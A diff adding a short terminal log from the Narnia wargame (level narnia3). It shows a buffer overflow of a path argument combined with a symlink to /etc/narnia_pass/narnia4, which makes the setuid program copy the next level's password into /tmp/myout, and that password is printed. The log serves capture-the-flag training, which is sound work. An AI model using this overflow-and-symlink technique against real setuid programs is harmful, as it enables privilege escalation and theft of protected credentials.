@@ -1,0 +1,11 @@
+narnia3@narnia:/narnia$ touch /tmp/outputAAAAAAAAAAAAAAAAAAAAA/tmp/myout
+narnia3@narnia:/narnia$ ./narnia3 /tmp/outputAAAAAAAAAAAAAAAAAAAAA/tmp/myout
+copied contents of /tmp/outputAAAAAAAAAAAAAAAAAAAAA/tmp/myout to a safer place... (/tmp/myout)
+narnia3@narnia:/narnia$ ln -s -T /etc/narnia_pass/narnia4 /tmp/outputAAAAAAAAAAAAAAAAAAAAA/tmp/myout
+ln: failed to create symbolic link '/tmp/outputAAAAAAAAAAAAAAAAAAAAA/tmp/myout': File exists
+narnia3@narnia:/narnia$ ln -s -T /etc/narnia_pass/narnia4 /tmp/outputAAAAAAAAAAAAAAAAAAAAA/tmp/myout -f
+narnia3@narnia:/narnia$ ./narnia3 /tmp/outputAAAAAAAAAAAAAAAAAAAAA/tmp/myout
+copied contents of /tmp/outputAAAAAAAAAAAAAAAAAAAAA/tmp/myout to a safer place... (/tmp/myout)
+narnia3@narnia:/narnia$ cat /tmp/myout
+thaenohtai
+▒(.▒▒P▒▒d▒▒▒▒▒▒ narnia3@narnia:/narnia$
